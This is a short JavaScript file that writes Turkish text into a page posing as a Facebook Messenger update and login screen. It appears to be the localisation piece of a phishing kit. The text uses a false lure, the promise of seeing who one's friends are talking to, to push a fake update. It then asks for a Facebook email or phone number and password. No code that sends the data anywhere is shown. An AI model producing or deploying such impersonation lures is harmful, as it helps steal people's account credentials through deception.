var mainParagraph = document.querySelector(".con-text");
var subMainParagraph = document.querySelector(".log-text");
var updateButton = document.querySelector(".update")
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".login"); 
var checkBox = document.querySelector(".chbox"); 

mainParagraph.innerHTML ="Arkadaşlarınızla kimin konuştuğunu bilmek gibi yeni özelliklerin keyfini çıkarmak için Messenger'ı en son sürüme güncelleyin";
subMainParagraph.innerHTML ="Hayatınızdaki insanlarla anında bağlantı kurun. Başlamak için Facebook ile giriş yapın.";
updateButton.innerHTML ="Şimdi güncelle";
userInput.setAttribute("placeholder" , "E-posta adresi veya telefon numarası");
passInput.setAttribute("placeholder" , "Parola");
logButton.setAttribute("value" , "Giriş yapmak");
checkBox.innerHTML ="Oturumumu açık tut";
